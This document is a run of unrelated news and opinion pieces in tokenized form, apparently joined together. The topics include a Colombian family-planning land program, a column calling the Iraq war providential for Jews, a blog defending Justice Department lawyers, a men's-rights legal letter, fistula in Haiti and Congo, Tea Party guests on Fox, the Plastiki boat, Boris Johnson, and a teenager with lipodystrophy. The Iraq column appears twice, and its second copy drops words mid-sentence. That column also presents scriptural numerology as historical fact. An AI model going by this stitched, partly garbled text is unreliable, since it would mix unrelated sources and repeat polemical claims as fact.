“ The church probably figures , why make a fuss ? ”
Public health professor Gloria Garay agrees with Goggel to a point , but worries that focusing on reproductive habits deflects attention from the responsibilities of the state to provide for its poorest citizens .
“ It ’s not just individual behavior but also social policy that sometimes keeps us from maintaining conditions of human dignity , ” said Garay , who is with the National University of Colombia in the capital , Bogota .
“ Keep in mind that as much as we ’ve reduced the birthrate in recent decades , half the country still lives in poverty . ”
Goggel ’s hopes that other landowners and even the Colombian government would embrace his idea have so far come to nothing .
Ricardo Gonzalez , the director of Goggel ’s House and Land Foundation , said one neighboring landowner responded to Goggel ’s request that he give land to the poor by saying : “ The only thing I ’ll give you is a bullet in the head . ”
Still , Goggel , who has spent more than $ 500,000 to buy 900 acres for the program , says he will press on .
He will not change his current practice of not transferring deeds to the families , fearing some would sell the property and revert to the rootless lifestyles many led .
That would defeat one purpose of his program : to provide a stable environment for the children of the poor couples , Goggel said .
So , instead his foundation holds the title to the parcels .
“ We ’re trying to give the country an idea how to approach the problem , hoping for a snowball effect , ” Goggel said .
“ But most people do n’t see the planet is doomed .
They are face down in their own bowl of soup and ca n’t see any farther . ”
Even those who do not share Goggel ’s apocalyptic view of the future agree that Colombia ’s birthrate is high and contributes to the poverty rate .
According to a United Nations survey , Colombia has a birthrate of 20.6 annual births per 1,000 inhabitants , above the relatively high Latin American average of 19.1 births , and 50 % higher than the United States ’ rate of 13.83 .
More distressing , said Garay , the public health professor , is the surge in teenage pregnancies to 90 births per 1,000 girls in 2005 from 70 in 1985 .
“ This is causing alarm , above all because the girls are getting pregnant despite knowing all the consequences that early maternity brings , ” said Garay , who maintains that sex education has improved in recent years .
Goggel ’s late father , Walter , emigrated from Switzerland and founded the Alpina dairy company near Bogota in 1945 .
The company since has grown into one of Latin America ’s largest dairy producers .
But Erwin showed little interest in business .
He pursued social causes and a career in theater and film production .
A self - described former Maoist , Goggel said it was his effort to establish an ecological reserve near here that opened his eyes to the region ’s grinding poverty .
When wild animals such as armadillos , iguanas and herons kept disappearing , he discovered that peasants were capturing and eating them to survive .
Further investigation showed that peasant families , often with six , seven or eight children , “ were living in terrifying misery and that their vision of the future extended no farther than avoiding hunger for a day . ”
Each generation was worse off .
“ It was the exception to come across sons who were better off than their fathers . ”
Asked how she and her husband had made out since accepting Goggel ’s offer last June , Marta Acosta , a 26 - year - old mother of two , said life had improved .
“ Even with the two children we have , it ’s still a battle against hunger .
But I did n’t want to reach the point of choosing which child to give Christmas presents to , ” she said .
“ How many more children does the world need , or must God send ? ”

They 're both right , and dead wrong .
True , most Jews in America and Israel want the US to capture Saddam Hussein and his gang , disarm Iraq of Weapons of Mass Destruction , institute some form of regime change , and introduce freedom and democracy .
But so do most Americans , many Iraqis , and many other freedom - loving people in the region and around the world .
Although it might be in Israel 's interest to see the ' neighborhood bully ' - Iraq - have its non-conventional weapons confiscated , it is also in America 's interest , it is also in Europe 's interest , it is even in Russia 's and China 's interest - they have both been plagued by Islamic terror in recent years .
And , though they might not like to admit it publicly , it is even in the interest of Arab states in the region .
Nobody who thinks about it for a couple of seconds should want a dictator like Saddam Hussein - who has already used chemical weapons on his own citizens , the Kurds , and his neighbors , the Iranians - to have Weapons of Mass Destruction .
Whether he uses them himself or passes them off to terror groups like al - Qaida , Abu Sayyaf in the Philippines , the Chechens , or Hamas and Islamic Jihad , who wants some nut cases releasing Small Pox , Anthrax , or VX Nerve Gas onto innocent civilian populations ?
However , we already knew that this war is for us - i.e. , the Jews and Israel .
Chazal - our sages - throughout the ages have explained the Torah , telling us that everything that happens in the world is for the benefit of the Jewish People .
Simply put another way , if all the world is a stage , then the Jews - and especially those in the Land of Israel - are the lead actors on the stage of history , and the goyim - the nations , i.e. the gentiles - have supporting roles , while the evil - doers are props and background scenery .
As our tradition states , G - D - the great playwright - created the world for the sake of the Jewish People , and it is our responsibility to implement the Torah - absolute morality and the blueprint of creation - in it .
Stop and think for a moment : the last Gulf War in 1991 ended erev - just before - Purim .
This Gulf War began motzei - just after - Shushan Purim .
Get the picture ?
In between , " The Jews had light , and gladness , and joy , and honor . "
( Book of Esther 8:16 )
Read the Purim story in Megilat Esther again , it is a rags to riches story on a national scale .
Haman , the proto-typical anti-Semite , plans mass murder of the Jews and in the end pays with his life , the life of his ten sons - all hanged - and the Jews kill 75 , 800 members of the anti-Semitic - i.e. Nazi - party of the time .
This is not so different from the Nuremberg Trials after World War II , when 23 Nazi war criminals were tried .
Originally 11 were to have the death penalty imposed if found guilty .
Everybody in those days thought that they would be shot - as is customary in military executions - or get the electric chair - as was common in the United States .
But when the judges announced the verdict of guilty , they also said that hanging would be the method of execution .
Two hours before the execution , they found Hermann Goering dead in his cell .
He had committed suicide .
That left only 10 Nazis to execute .
There is more to this story than meets the eye .
In Megilat Esther ( 9:7 - 9 ) , when it describes the execution of Haman 's ten sons , their names are listed in a vertical column .
If you look at the Hebrew closely , you 'll notice extra - small letters in three of the names .
The first name , Parshandata , has a small tav .
The seventh name , Parmashta , has a small shin .
The tenth name , Vayzata , has a small zayn .
Hebrew letters are also used as numbers , as well as for dates in the Jewish calendar .
Tav , shin , zayn numerically means 707 , corresponding to the year 5707 , which began with Rosh HaShanah - the Jewish New Year - on September 25 , 1946 .
On October 16 , 1946 , as foreshadowed in the names of Haman 's ten sons , ten Nazi leaders were hanged as war criminals .
And if that does n't impress you , out of nowhere , with the rope around his neck , Julius Schtreicher - editor of Der Sturmer , the Nazi propaganda newspaper - shouted out with flaming hatred in his eyes , just as the trap door opened , " Purimfest 1946 ! "
It was reported in the international press of the day .
As I said earlier , of course this war is for the Jews and Israel , and instead of hiding from the accusation , or crying , " anti-Semitic slur " , we should gratefully acknowledge what the Master of the Universe is doing to our enemies for us .
Saddam Hussein , Yasser Arafat , Bashar Assad , Osama Bin-Laden , and the other dictators , terrorists and mullahs of the region , are the modern day Hamans and Hitlers .
Great things are yet to come .
The Hebrew month of Adar is a time for ' increasing joy ' .
Purim is a time for celebrating our salvation from enemies who plot our destruction .
Adar falls at the end of the calendar for months and the end of the winter .
And after Adar comes Nisan - or Aviv , meaning springtime .
Springtime is a time of rebirth and regeneration after a long dark winter .
Pesach - Passover - Z'man Cherutainu - the time of our freedom - falls in Nisan .
In Nisan , we were redeemed from slavery in Egypt , and the future redemption will be in Nisan .
Rabbi Avraham Yitzhak HaCohen
Kook taught that we were liberated from Egyptian bondage in order to bring liberation to the entire world .
The Torah repeats three times that we departed Egypt in the springtime ( Exodus 13:4 , 26:15 , and Deuteronomy 16:1 ) , because our freedom is not only the spring of our people , but also the spring of the entire world and its inhabitants .
The objective of our liberation is to perfect the world under the reign of the Almighty , as G -d promised Abraham , " and through you all the families of the earth will be blessed . "
( Genesis 12:3 )
Yes , the war is for the Jews .
But it is also for all decent , peace - loving and freedom - loving people .
Just as when the Jews were saved from Egyptian slavery , liberated , given the Torah at Mt. Sinai , and brought into the Holy Land , the world now has a great opportunity to rid itself of the Hamans , Hitlers , and Pharaohs who want to kill or enslave them today .
In the Purim story , Mordechai told Queen Esther , when she seemed apprehensive about approaching the king to ask for help to avert Haman 's plan of genocide , " If you remain silent at this time , then relief and deliverance will come to the Jews from elsewhere , but you and your father 's house will perish . "
( Book of Esther 4:14 ) That is what we should tell the Pat Buchanans , the Jim Morans , and all those in America and around the world who say that the Jews are behind America 's war in Iraq .
That is what we should tell all those in the ?
Anti-War Movement ?
who are against America .
Pat Buchanan really is Anti-American , though he hides it well .
Who could imagine an isolationist America , disengaged from the world , as he advocates ?
Terrorists and terrorist states would multiply .
It would end up bringing more tragedies like September 11th to America .
Rather than blame America 's support for Israel for September 11th , as he and Jihadist Muslims have done , Israel , America , and their allies will lessen the threat of mass murder , through war on Iraq , on other terror - regimes , and on terrorist groups .
Great things are coming , for the Jewish People , for the State of Israel , for America , for the Western democratic world , and for all those who aspire to be like them .
And why should we apologize for that ?

Spend Passover with Arutz Sheva at a resort in Jerusalem , Tel Aviv or Kfar Pines ( near Hadera ) .
Of course this war against Iraq and Saddam Hussein is for us .
Even the anti-Semites , like Patrick J. Buchanan and Congressman Jim Moran know it .
Pat Buchanan has been accusing the neo-conservatives , what he calls the War Party - i.e. , the Jews and their followers in America - of pushing the United States into this war .
He 's also blamed Prime Minister Sharon and Israel for wanting the war .
That 's what he said in a recent article , " Whose War ? " Rep .
Moran recently came out of the closet saying , " If it were not for the strong support of the Jewish community for this war with Iraq , we would not be doing this . "
Other anti-Semites have also been saying it .

However , we already knew that this war is for us - i.e. , the Jews and Israel .- our sages - throughout the ages have explained the Torah , telling us that everything that happens in the world is for the benefit of the Jewish People .
Simply put another way , if all the world is a stage , then the Jews - and especially those in the Land of Israel - are the lead actors on the stage of history , and the- the nations , i.e. the gentiles - have supporting roles , while the evil - doers are props and background scenery .
As our tradition states , G - D - the great playwright - created the world for the sake of the Jewish People , and it is our responsibility to implement the Torah - absolute morality and the blueprint of creation - in it .
Stop and think for a moment : the last Gulf War in 1991 ended - just before - Purim .
This Gulf War began - just after - Shushan Purim .
Get the picture ?
In between , " The Jews had light , and gladness , and joy , and honor . "
( Book of Esther 8:16 ) Read the Purim story inEsther again , it is a rags to riches story on a national scale .
Haman , the proto-typical anti-Semite , plans mass murder of the Jews and in the end pays with his life , the life of his ten sons - all hanged - and the Jews kill 75 , 800 members of the anti-Semitic - i.e. Nazi - party of the time .
This is not so different from the Nuremberg Trials after World War II , when 23 Nazi war criminals were tried .
Originally 11 were to have the death penalty imposed if found guilty .
Everybody in those days thought that they would be shot - as is customary in military executions - or get the electric chair - as was common in the United States .
But when the judges announced the verdict of guilty , they also said that hanging would be the method of execution .
Two hours before the execution , they found Hermann Goering dead in his cell .
He had committed suicide .
That left only 10 Nazis to execute .
There is more to this story than meets the eye .
In ( 9:7-9 ) , when it describes the execution of Haman 's ten sons , their names are listed in a vertical column .
If you look at the Hebrew closely , you 'll notice extra - small letters in three of the names .
The first name , Parshandata , has a small .
The seventh name , Parmashta , has a small .
The tenth name , Vayzata , has a small .
Hebrew letters are also used as numbers , as well as for dates in the Jewish calendar .
numerically means 707 , corresponding to the year 5707 , which began with - the Jewish New Year - on September 25 , 1946 .
On October 16 , 1946 , as foreshadowed in the names of Haman 's ten sons , ten Nazi leaders were hanged as war criminals .
And if that does n't impress you , out of nowhere , with the rope around his neck , Julius Schtreicher - editor of , the Nazi propaganda newspaper - shouted out with flaming hatred in his eyes , just as the trap door opened , " Purimfest 1946 ! "
It was reported in the international press of the day .
As I said earlier , of course this war is for the Jews and Israel , and instead of hiding from the accusation , or crying , " anti-Semitic slur " , we should gratefully acknowledge what the Master of the Universe is doing to our enemies for us .
Saddam Hussein , Yasser Arafat , Bashar Assad , Osama Bin-Laden , and the other dictators , terrorists and mullahs of the region , are the modern day Hamans and Hitlers .
Great things are yet to come .
The Hebrew month of Adar is a time for ' increasing joy ' .
Purim is a time for celebrating our salvation from enemies who plot our destruction .
Adar falls at the end of the calendar for months and the end of the winter .
And after Adar comes Nisan - or , meaning springtime .
Springtime is a time of rebirth and regeneration after a long dark winter . -
Passover -- the time of our freedom - falls in Nisan .
In Nisan , we were redeemed from slavery in Egypt , and the future redemption will be in Nisan .
Rabbi Avraham Yitzhak HaCohen
Kook taught that we were liberated from Egyptian bondage in order to bring liberation to the entire world .
The Torah repeats three times that we departed Egypt in the springtime ( Exodus 13:4 , 26:15 , and Deuteronomy 16:1 ) , because our freedom is not only the spring of our people , but also the spring of the entire world and its inhabitants .
The objective of our liberation is to perfect the world under the reign of the Almighty , as G -d promised Abraham , " and through you all the families of the earth will be blessed . "
( Genesis 12:3 ) Yes , the war is for the Jews .
But it is also for all decent , peace - loving and freedom - loving people .
Just as when the Jews were saved from Egyptian slavery , liberated , given the Torah at Mt. Sinai , and brought into the Holy Land , the world now has a great opportunity to rid itself of the Hamans , Hitlers , and Pharaohs who want to kill or enslave them today .
In the Purim story , Mordechai told Queen Esther , when she seemed apprehensive about approaching the king to ask for help to avert Haman 's plan of genocide , " If you remain silent at this time , then relief and deliverance will come to the Jews from elsewhere , but you and your father 's house will perish . "
( Book of Esther 4:14 ) That is what we should tell the Pat Buchanans , the Jim Morans , and all those in America and around the world who say that the Jews are behind America 's war in Iraq .
That is what we should tell all those in the ?
Anti-War Movement ?
who are against America .
Pat Buchanan really is Anti-American , though he hides it well .
Who could imagine an isolationist America , disengaged from the world , as he advocates ?
Terrorists and terrorist states would multiply .
It would end up bringing more tragedies like September 11th to America .
Rather than blame America 's support for Israel for September 11th , as he and Jihadist Muslims have done , Israel , America , and their allies will lessen the threat of mass murder , through war on Iraq , on other terror - regimes , and on terrorist groups .
Great things are coming , for the Jewish People , for the State of Israel , for America , for the Western democratic world , and for all those who aspire to be like them .

Latest Conservative Smear Calls Justice Dept. Lawyers Terror - Sympathizers
Created : February 26 , 2010 17:38 | Last updated : July 31 , 2020 00:00
In the latest bit of brazen slander from the right , Republican Senators are trying to invent a scandal about Justice Department lawyers who — horror — represented Guantanamo detainees .
You know , provided the representation that the Rehnquist and Roberts Supreme Court has repeatedly ruled those detainees are entitled ?
And which even the military commissions provide for ?
Instead , there ’s this McCarthyite tactic of calling Justice Department lawyers the “ Gitmo Nine , ” a name that oh - so - cleverly suggests that those lawyers were themselves detained at Guantanamo .
From the Washington Times :
Sen .
Chuck Grassley of Iowa is rightly unhappy that the Justice Department wo n’t divulge the names of the nine Justice Department lawyers who directly represented suspected - terrorist detainees , or their cases .
Grassley identified two himself , Neal Katyal ( an aside : Katyal is a very impressive guy and very charming and level - headed ) and Jennifer Daskal .
There ’s absolutely nothing “ hidden ” about this ; it ’s a pure smear job .
Daskal , a former Human Rights Watch attorney , is so committed to hiding her representation of Guantanamo detainees that it ’s on her Wikipedia page .
And Katyal , the deputy solicitor general whom even this Washington Times bottom - feeder has to concede is a talented attorney , very publicly represented Salim Ahmed Hamdan and took his case to the Supreme Court , which promptly struck down the first phase of the military commissions .
There is not a shred of a legitimate issue here , just pure innuendo .
Grassley knows exactly what he ’s doing .
He ’s taking one of the strengths of the American justice system — the fact that everyone is entitled to legal representation — and implying that it ’s unseemly .
It ’s a testament to the weakness of his character that he will never forthrightly accuse these attorneys of what he ’s implying — sympathy with accused terrorists — in a way that they could refute .
What a pathetic excuse for a man .
Those of us in the media have an obligation to call this smear campaign what it is .
" Koire ’s holding was upheld by the California Supreme Court in Angelucci v. Century Supper Club ( 2007 ) 41 Cal.4th 161 , another “ Ladies ’ Night ” case , wherein the Court unanimously ruled discrimination victims do not have to affirmatively assert their right to equal treatment in order to have a discrimination claim under the Unruh Act or Gender Tax Repeal Act .
The National Coalition For Men filed an amicus brief in support of the prevailing appellants in Angelucci .
" All persons within the jurisdiction of this state are free and equal , and no matter what their sex , race , color , religion , ancestry , national origin , disability , medical condition , marital status , or sexual orientation are entitled to the full and equal accommodations , advantages , facilities , privileges , or services in all business establishments of every kind whatsoever .
California ’s Unruh Civil Rights Act , codified as California Civil Code section 51 .
" Similarly , Civil Code section 51.5 mandates ,
No business establishment of any kind whatsoever shall discriminate against , boycott or blacklist , or refuse to buy from , contract with , sell to , or trade with any person in this state on account of any characteristic listed or defined in subdivision ( b ) or ( e ) of Section 51 .
" Civil Code section 51.6 , Gender Tax Repeal Act of 1995 , provides , ( b ) No business establishment of any kind whatsoever may discriminate , with respect to the price charged for services of similar or like kind , against a person because of the person ’s gender .
" Civil Code section 52 provides the remedies for violations of sections 51 , 51.5 , and 51.6 .
Whoever denies , aids or incites a denial , or makes any discrimination or distinction contrary to Section 51 , 51.5 , or 51.6 , is liable for each and every offense for the actual damages , and any amount that may be determined by a jury , or a court sitting without a jury , up to a maximum of three times the amount of actual damage but in no case less than four thousand dollars ( $ 4,000 ) , and any attorneys ’ fees that may be determined by the court in addition thereto… .
" Pursuant to Civil Code section 52 , ANA and any business that “ aids ” in any sex discrimination , such as Los Angeles World Airports and San Francisco International Airport , is liable for the actual damages and a minimum of $ 4,000 in mandatory statutory damages for each and every offense committed against all male passengers who were denied access to the women - only bathrooms on ANA flights to and from California .
In addition , because California has such a strong public policy to eradicate sex discrimination , prevailing plaintiffs – and only prevailing plaintiffs – are entitled to their attorneys ’ fees for any litigation concerning violations of the above Civil Code sections .
See Engel v. Worthington , ( 1997 ) 60 Cal.App.4th 628 ( attorneys ’ fees are mandatory for prevailing plaintiffs in Unruh Act claims ) .
" Furthermore , the California Supreme Court ’s recent Unruh Act opinion , North Coast Women ’s Care Center v. San Diego Superior Court ( 2008 ) 44 Cal.4th 1145 , held “ liability under the act for denying a person the full and equal accommodations , advantages , facilities , privileges , or services of a business establishment ( §51 , subd .
( b ) ) extends beyond the business establishment itself to the business establishment ’s employees responsible for the discriminatory conduct . ”
Therefore , principals or employees of ANA and the Los Angeles and San Francisco airports may be individually liable for the remedies provided by Civil Code section 52 for violations of sections 51 , 51.5 , and 51.6 .
Women - only bathrooms would violate Civil Code section 51.6 , the Gender Tax Repeal Act , because women and men are presumably charged the same price to fly on ANA , but men would get less for their money by being denied access to the women - only bathrooms based on their sex .
The California Attorney General remains diligent in eradicating business practices that discriminate against consumers based on sex .
For example , in response to the proliferation of ladies - only poker tournaments at California ’s licensed card rooms , the Attorney General issued a January 18 , 2008 Gambling Establishment Advisory , which reads , in part : Under the Unruh Civil Rights Act ( Civil Code sections 51 and 51.5 ) , businesses may not discriminate in admittance , prices , or services offered to customers based on the customers ’ sex , race , color , religion , ancestry , national origin , disability , medical condition , marital status , or sexual orientation .
“ Ladies only ” tournaments or any other promotional events that fail to admit men and women to advertised activities on an equal basis regardless of sex are unlawful .
It may also be unlawful under the Unruh Act to advertise tournaments as “ ladies only ” even if men are in fact admitted .
The National Coalition For Men ( NCFM ) is the oldest men ’s rights organization in America with members throughout the United States and in several other countries .

Tuesday 's earthquake in Haiti reminds us of the gender - related needs of women -- particularly in times of disaster .
But success stories do exist .
This is Caroline 's story .
Tuesday ’s earthquake in Haiti reminds us how vulnerable women and
children are – particularly in times of disaster .
Poor and disadvantaged women
tend to be unequally affected by natural disasters and are often
overrepresented in death tolls .
One of the poorest countries in the Western Hemisphere , Haiti already has the
highest rate of maternal
mortality in the region – 670 deaths per 100,000 live births .
Pregnant
women in and around the country ’s capital , Port - au - Prince , lack access to even
the most basic health services .
Although the odds are against women in Haiti , and against women throughout the
developing world , success stories do exist : Caroline Ditina is a young woman in the Democratic Republic of Congo who
successfully survived obstetric fistula — a medical condition that the World
Health Organization ( WHO ) calls " the single most dramatic aftermath of
neglected childbirth . "
Last week , this same young woman was highlighted in Secretary Clinton ’s
landmark speech , during which she cited Caroline ’s story as a reminder that " Every woman everywhere deserves
high - quality care not only at her most vulnerable hour , but at every single
stage of life . "

Caroline Ditina is a young woman from the Democratic Republic of Congo who successfully survived obstetric fistula – a medical condition that the World Health Organization ( WHO ) calls the single most dramatic aftermath of neglected childbirth .
Last week , Caroline was highlighted in Secretary Clinton ’s landmark speech .
Secretary Clinton cited Caroline ’s story as a reminder that every woman everywhere deserves high - quality care not only at her most vulnerable hour , but at every stage of life .
In developing countries , an estimated two million women are living with
fistula , with an additional 50,000 to 100,000 new cases occurring each year .
The average cost of fistula treatment – including surgery , post - operative care
and rehabilitation support – is $ 300 , which is , unfortunately , well beyond the
reach of most women with the condition .
Because of the stigma attached to the
condition , women who develop fistulas are often abandoned by their husbands ,
rejected by their communities , and forced to live an isolated existence .
Caroline ’s story , and the stories of millions of women like her , continue to
remind us of the importance of addressing the needs and rights of women and
girls – particularly those who are most vulnerable .
Caroline is a success
story ; many are not so lucky .

Sarah Palin was mercilessly mocked after getting caught reading notes off her hand during a question - and - answer session in February ’s Tea Party convention .
But two Tea Partiers were apparently impressed , and flashed her a celebratory note on their own palms during an appearance on Fox & Friends Monday .
John Knapp and Eddie Roberts appeared as guests on the network ’s morning show to discuss a new billboard they created .
They later flashed their palms at the camera , showing that they had written “ Go Sarah ” — a clear reference to Palin .
ADVERTISEMENT
Roberts ’s palm contained the word “ Go ” while Knapp ’s read “ Sarah . ”
“ We wrote it on our hands just for her , ” Knapp said .
The billboard , splayed along highway I - 75 in northern Florida , read :
Now it ’s personal .
America ’s coming for you , Congress !
Vote Liberals out in 2010 !
The Fox hosts showed a close - up of the billboard at three different points in the 5 - minute segment for a total of roughly 40 seconds .
It had American flags in three corners and “ We the people ” written on the bottom right .
ADVERTISEMENT
The self - professed “ fair and balanced ” network has been accused of excessively hyping the Tea Party movement ’s influence as a grassroots uprising against a Democratic Congress and presidency .
Last year conservative author Bernard Goldberg , who frequently criticizes the “ liberal media , ” blasted Fox News for “ cheerleading ” the Tea Party protests .
The liberal watchdog Media Matters released an extensive report in May 2009 , just months after the movement ’s inception , explaining how Fox was “ aggressively ” promoting it .
ADVERTISEMENT
In September , Media Matters obtained footage of a Fox newscaster stage managing a crowd of Tea Party protesters at a Washington , DC rally .
After discussing the billboard and their dissatisfaction with the Democratic establishment in Washington , they expressed their gratitude to the network .

“ I would like to thank Fox News , if I might , ” Roberts said .
“ Without Fox News , the other major media really does n’t cover what ’s going on in the country , or the politics . ”
Fox host Steve Doocy responded , “ Well , we ’ve got to give all the sides , and that ’s what we do our best to do . ”
Doocy pointedly asked Knapp in the segment if he was “ upset ” at the government ’s desire to “ jam this health care bill through , ” to which Knapp responded that it was it was “ just one of a whole lot of things . ”

“ Voters are angry , and they ’re sending messages , ” said host Gretchen Carlson , who described the billboard as an example of “ anger and frustration at the federal government . ”

Gov. Arnold Schwarzenegger announced today that he would not sign a bill lawmakers passed to bring new tax relief to homeowners and green energy companies , in large part because it would ramp up the penalties against those who abuse such tax credits .
The governor ’s move came at the urging of a coalition that includes the California Chamber of Commerce , the Western States Petroleum Assn . and the California Manufacturers and Technology Assn .
It lobbied against the bill , SBX8 32 , arguing that it would make businesses reluctant to claim tax breaks for fear of making an error .
The governor ’s announcement puts in jeopardy tax breaks targeted at Californians who lose their homes in short sales and businesses in the state ’s burgeoning green tech sector .
Administration officials urged lawmakers to immediately get back to work crafting a new proposal and to pass it in time for Californians to be able to claim the credits on their 2009 returns , due April 15 .
But Democrats said it is unlikely a new bill would get enough votes , leaving taxpayers out of luck .

The Plastiki is said to be one of the greenest vessels ever built A 18 m ( 60 feet ) long boat made mostly from trash is patiently waiting for fair weather so it can take to the high seas to drive home the environmental message of recycling , reusing and rethinking the way we deal with plastic .
The appropriately named Plastiki , which is made from over 12,500 plastic bottles , will set sail from San Francisco and head to Sydney with eco-warrior and banking heir David De Rothschild at the helm .
He was inspired to set up the expedition after reading a report from the United Nations that said that four out of every five plastic bottles end up in a landfill site instead of being recycled .
" In the United States alone , 38 billion plastic water bottles end up being thrown away , " Mr De Rothschild told the BBC .
" That is a resource that can be harvested .
Instead of going into the landfill , that plastic could be turned into wind turbines , housing , into new boats - any number of things that would then have less of an impact on the environment . "
Garbage patch
The 11,000 nautical mile journey the Plastiki is embarking on will centre on a sea of garbage that sits just below the surface between California and Hawaii .
The Great Pacific Garbage Patch as it is known is said to contain so much detritus that it weighs around 100 m tons and is about five times the size of the UK or twice the size of Texas .
Plastics get broken down , but are not bio- degradable The United Nations has estimated that 46,000 pieces of plastic no bigger than a cent or a penny , is floating on every square mile of the world 's oceans causing untold damage to marine habitats .
" It is time we beat waste and this is an out - of - sight , out - of - mind issue that needs to be addressed , " said Mr De Rothschild .
The 31 - year - old adventurer , who has completed expeditions to both poles and various jungles , said he also wants to use this journey to highlight other environmental issues and use the Plastiki to raise awareness .
" Our boat may be one giant floating water bottle but it is also a catalyst for a global conversation .
We speak for the oceans because they have no voice . "
Right from the start , we designed this boat so it could be recycled at the end of its usage .
Matthew Grey , Plastiki expedition director Another source of inspiration for the Plastiki was a 1947 journey by scientist Thor Heyerdahl who sailed a balsa raft named the Kon -Tiki from Peru across the Pacific .
Olaf Heyerdahl , who is a carpenter , retraced his grandfather 's footsteps in 2006 .
He is taking part in the Plastiki project because he has seen at first hand the effects of the devastation .
" I know the oceans are getting polluted and it is good to show people what is happening .
When my grandfather sailed in the Kon - Tiki they did n't see any pollution and they had sharks every single day .
So many they could hardly swim .
When we crossed the Pacific we had four sharks .
" They had tuna every single day , every dinner .
We had one tuna during the whole journey , " said Mr Heyerdahl .
Eco stunt
The Plastiki is one of a kind , taking recycling to a whole other level .
The 12,500 used water bottles are filled with carbon dioxide to make the vessel durable and buoyant .
The team has invented a new glue to bond the boat together made of cashew nuts and sugar .
The solar panels will help with the Plastiki 's green credentials
The catamaran , which hopes to set sail in the next couple of weeks , will be powered by solar , wind and sea turbines .
An exercise bike will power the boat 's laptops and there is also a composting bathroom and gardens to grow food .
A plan to install an infiltration system to turn urine into water was shelved .
" It was a bit like scrap heap challenge where you just wander around and pick up stuff that is suitable , " said expedition director Matthew Grey .
" Right from the start , we designed this boat so it could be recycled at the end of its usage . "
Mr De Rothschild is particularly enthusiastic about a new material they have developed called srPET .
That stands for self - reinforced polyethylene terephthalate , a fully recyclable plastic that he hopes will one day replace fibreglass .
" This is a serious design project with a serious message and real world solutions .
We are showcasing solutions on the boat that can come online now and new materials and new glues that can be applied in the real world that will hopefully move the needle for this real world problem . "
Creature comforts
Being at sea for several months in a confined space with four other people for company is no mean feat .
The crew will be at sea for around three months Olaf Heyerdahl knows the rigours only too well after spending three months at sea on a 52 foot raft .
" You have to be open minded and if you get irritated about small things like body smells , slurping food you will be in trouble . "
Mr Heyerdahl is bringing some music with him to help the time go by as well as a copy of Mutiny on the Bounty .
Mr De Rothschild admitted that the journey will have its challenges .
" Personal hygiene will be an issue but when you hit a squall or a downpour , everyone tries to run outside to get a shower so that will help .
I am used to living in tents for many months on end .
I 've spent 100 day in the Arctic and Antarctica in a tent that is a lot smaller .
" I think Kermit the frog summed it up best when he said ' It is n't easy being green ' , " said Mr De Rothschild .

Boris Johnson may condemn violence and antisocial behaviour in his day job as mayor of London , but he is not averse to expressing a rather violent desire to " end what is left of my political career with one almighty head - butt " levelled at Ed Balls , the schools secretary .
Johnson 's tirade against Balls was a response to what the Conservative mayor described as " death - defyingly stupid " comments from Balls on the subject of Latin in schools .
" There are times when a minister says something so maddening , so death - defyingly stupid , that I am glad not to be in the same room in case I should reach out , grab his tie , and end what is left of my political career with one almighty head - butt , " said the mayor , renowned as a passionate classicist .
" Such were my feelings on reading Mr Ed Balls on the subject of teaching Latin in schools . "
Johnson 's comments , provoked by the minister 's claim that " very few parents " are pushing for Latin in state schools , were not blurted out in a red mist moment , but crafted for his Daily Telegraph column , for which he earns £ 250,000 a year .
Is this fighting talk fitting for such a key Tory figure ?
Conservative Central
Office did as it often does when the mayor says or does something potentially embarrassing and declined to comment , saying it was a matter for City Hall , not them – which is strange since the mayor is spending his spare time at the moment visiting London constituencies with Tory candidates .
Emily Thornberry , a north London MP , appeared to be more shocked by the mayor 's priorities than his colourful language .
" Perhaps if Boris Johnson cared as much the pressing needs of London as he does about Latin there would be lower bus fares , no cuts to police numbers , no cuts to tube ticket office staff and a much smaller list of broken manifesto commitments , " she said .
Meet a Teenager Who Looks Like a Grandma Zara , 13 , lives with a condition that makes her appear much older .
LONDON , Feb. 1 , 2010  -- Zara Hartshorn has been robbed of her childhood .
Her mom took her out of school because the bullying was so bad .
A bus driver laughed in her face recently when she tried to pay the child 's fare .
Strangers stare and point in the street .
Kids call her " grandma , " " monkey " and " baggy face . "
Zara is 13 but has a rare genetic condition that makes her look much , much older than her years .
She has the face of a grown woman , gaunt and wrinkled .
But she 's a frightened teen inside .
" It feels like people are looking down their noses at me and staring , " she said at her home in northern England .
" You know when you get that feeling you 're being watched ?
I feel that everywhere I go . "
Zara 's mother , Tracey Pollard , feels her pain :
She , too , was born with lipodystrophy .
Pollard , 41 , noticed the tell - tale signs in Zara 's face at birth .
" I was grieving for a child that 's got to go through the same things in life that I 've had to go through , " she said .
" I was angry at myself for actually having Zara . "
Lipodystrophy is a genetic disease .
It is hereditary .
It robs the body of the ability to produce fat cells beneath the skin .
" Fatty tissue does n't grow right , " Dr. Donald Kotler of St. Luke 's Roosevelt Hospital in New York City said .
" Normal fatty tissues shrink , making people look sort of old and wrinkled and abnormal . "
Lipodystrophy can also bring on diabetes and , later in life , heart disease , stroke and liver problems .
There is no cure for lipodystrophy .
" What you 're left trying to do is to manage it , " Kotler said .
" It 's bad enough in an adult , but I would think for a child it would be devastating . "
Pollard 's first child , Gareth , was born healthy .
So Tracey thought her kids would be safe .
Two of her younger children showed only very mild symptoms .
Then Zara , the youngest , was born .
When asked what she feels when she sees her own face in the mirror , Zara said , " I do n't like it .
Sometimes I 'll sit in my room and start pulling my skin back , stuff like that .
Most teenagers worry about getting spots .
... I 'm worried about surgery and stuff like that and when 's bullying going to stop . "
Zara : ' I Want a Face - Lift '
Zara lives at home with her mom , sisters and a brother .
There is , of course , the usual rough - and - tumble and sibling bickering one would expect in a large family .
But , Zara said , she feels safe and loved .
No one makes fun of her , unlike every time she steps outside her front door , where she 's scared .
Zara was , she said , a confident little girl .
Then at age 5 , the bullying started .
" The kids started calling me names , " she said .
Zara went home in tears .
" I asked my mom why I was different , " she said .
As she grows older , Zara 's anxiety has increased .
She lives in Rotherham , South Yorkshire , in a hardscrabble , deprived neighborhood .
Life here is tough .
For her , it 's tougher .
" I want a face - lift , " she said .
Her mother had surgery when she was a teenager in an effort to smooth her wrinkled face .
But , Pollard said , it did n't help much .
" My expectations were too high , " she said .
" I thought I would look like a normal kid ... but I did n't . "
Her appearance has had a huge impact on her life , she said .
She has low self - esteem , has never had a career and has suffered a string of abusive relationships .
" I do n't want [ Zara ] ending up like me , " she said .
" Surrounding herself with seven , eight or however many kids just to feel loved .
...
And she does n't need to go from one man to another looking for something she 'll never find . "
When she 's older , Zara said , she wants to be a beauty therapist .
Her mother , a single parent who lives on benefits , is supportive .
" You always have hope and your dreams , " Pollard said .
" No one can take that away from you no matter how bad they treat you . "
